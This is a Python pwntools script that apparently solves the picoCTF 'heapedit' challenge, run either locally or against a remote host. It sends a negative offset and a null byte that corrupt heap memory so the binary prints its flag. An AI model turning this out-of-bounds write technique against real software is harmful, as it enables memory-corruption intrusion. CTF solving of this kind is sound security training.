#!/usr/bin/env python3

import os
import shutil
import sys

from pwn import *


def usage(err=None):
    if err is not None:
        log.failure(f"error: {err}")
    log.failure("usage: one of\n")
    log.failure("  crack.py local <heapedit> <ld.so> <libc> <flag>")
    log.failure("  crack.py remote <host:str> <port:int>\n")
    sys.exit(0 if err is None else -1)


def setup(solve):
    if sys.argv[1] == 'local':
        if len(sys.argv) != 6:
            usage("wrong number of arguments")
        if any(not os.path.isfile(f) for f in sys.argv[2:]):
            usage("invalid filepath provided")
        local = True
        heapedit, ldso, libc, flag_file = sys.argv[2:]
    elif sys.argv[1] == 'remote':
        if len(sys.argv) != 4:
            usage("wrong number of arguments")
        local = False
        host, port = sys.argv[2:]
        try:
            port = int(port)
        except ValueError:
            usage("port must be an int")
    else:
        usage(f"unknown connection type: {sys.argv[1]}")

    if local:
        with open(flag_file, 'rb') as f:
            flag = f.read()
        with tempfile.TemporaryDirectory() as wd:
            with open(os.path.join(wd, 'flag.txt'), 'wb') as f:
                f.write(flag)
            tmp_exe = os.path.join(wd, 'exe')
            shutil.copy(heapedit, tmp_exe)
            shutil.copy(ldso, wd)
            shutil.copy(libc, wd)

            with process([tmp_exe], cwd=wd) as tube:
                solve(tube, expected=flag)
    else:
        with remote(host, port) as tube:
            solve(tube)


def solve(cxn, expected=None):
    # only 0x40 bytes are read from the file; anything extra won't be there
    MAX_FLAG = 0x40

    if expected is not None:
        expected = expected[:MAX_FLAG]
        log.info(f"Solving; expecting flag: {expected!r}")
    else:
        log.info("Solving")

    cxn.recvrepeat(0.1)
    cxn.send(b'-5144\n')
    cxn.recvrepeat(0.1)
    cxn.send(b'\x00\n')
    resp = cxn.recvrepeat(0.1)
    if expected is not None:
        if expected in resp:
            log.success(f"Flag found in: {resp}")
        else:
            log.failure(f"Expected flag not in {resp}")
    elif b'picoCTF{' in resp:
        flag_start = resp.index(b'picoCTF{')
        flag_end = resp.index(b'}', flag_start)
        flag = resp[flag_start:flag_end + 1].decode('utf-8')
        log.success(f"PicoCTF flag found: {flag}")
    else:
        log.info(f"Got response: {resp.decode('utf-8')}")


if __name__ == '__main__':
    setup(solve)
